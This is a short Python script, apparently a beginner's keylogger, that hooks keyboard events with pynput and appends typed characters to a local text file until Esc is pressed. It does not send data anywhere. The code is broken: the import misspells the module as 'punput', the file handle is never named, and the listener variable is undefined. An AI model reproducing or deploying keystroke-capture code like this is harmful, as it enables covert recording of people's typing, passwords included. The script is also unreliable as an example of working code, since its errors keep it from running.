import pynput
from punput.keyboard import Listener,Key

lines = ""

#functioning for writing lines to a file
def write_file(lines):
	with open("test_file.txt","a"):
		file.write(lines + "\n")
	print()

#parameters key are for keyboard

def on_press(key):
	global lines
	print(key)
	if key == Key.enter:
		write_file(lines)
		lines="\n"
	elif str(key).replace("'","").isalnum():
		lines += str(key).replace("'","")
	elif key == Key.space:
		lines += " " 
	print()

def on_release(key):
	if key == Key.esc:
		return False
	

with Listener(on_press=on_press, on_release=on_release) as Listener:
	listener.join()
